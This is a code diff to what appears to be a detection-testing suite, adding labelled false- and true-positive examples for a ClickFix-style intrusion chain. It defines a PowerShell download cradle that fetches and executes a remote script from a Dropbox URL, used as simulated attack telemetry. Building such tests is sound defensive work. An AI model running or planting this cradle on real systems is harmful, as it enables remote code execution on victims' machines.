@@ -20,9 +20,14 @@ import {
   fpWorld,
   INTUNE_AGENT_PARENT,
   tpWorld,
+  withBenignActivity,
+  withCradle,
   withManagementDestinations,
   withoutChainParents,
 } from './worlds';
+
+const DROPBOX_CRADLE =
+  'powershell.exe -w min -c "iex (irm \'https://dl.dropboxusercontent.com/scl/fi/k2x9q/update.ps1?dl=1\')"';
 
 const eventId = (runMarker: string, eventKey: string): string =>
   getChainIds(MIMICRAT_CHAIN, runMarker).eventId(eventKey);
@@ -115,10 +120,12 @@ export const MIMICRAT_EXAMPLES: readonly FpTpExample[] = [
     evidenceState: 'complete',
     expectedOutcome: 'false_positive',
     labelProvenance: 'adversarial-mutation',
-    mutation: 'no entity role, no parents, management destinations',
+    mutation: 'benign activity with no entity role, no parents, management destinations',
     checks: { entityRole: 'neutral', processParent: 'neutral', networkDestination: 'contradicts' },
     buildWorld: (runMarker) =>
-      withManagementDestinations(withoutChainParents(tpWorld(runMarker, 'unknown'))),
+      withManagementDestinations(
+        withoutChainParents(withBenignActivity(tpWorld(runMarker, 'unknown'), runMarker))
+      ),
   },
   {
     id: 'mimicrat-clickfix.fp-entities-missing',
@@ -158,11 +165,11 @@ export const MIMICRAT_EXAMPLES: readonly FpTpExample[] = [
     },
     buildWorld: (runMarker) =>
       withNetworkDestination(
-        withNetworkDestination(tpWorld(runMarker), MIMICRAT_STAGE2_DOMAIN, {
-          domain: 'dl.dropboxusercontent.com',
-          ip: '162.125.1.15',
-          port: 443,
-        }),
+        withNetworkDestination(
+          withCradle(tpWorld(runMarker), runMarker, DROPBOX_CRADLE),
+          MIMICRAT_STAGE2_DOMAIN,
+          { domain: 'dl.dropboxusercontent.com', ip: '162.125.1.15', port: 443 }
+        ),
         MIMICRAT_C2_DOMAIN,
         { domain: 'api.dropbox.com', ip: '162.125.1.18', port: 443 }
       ),
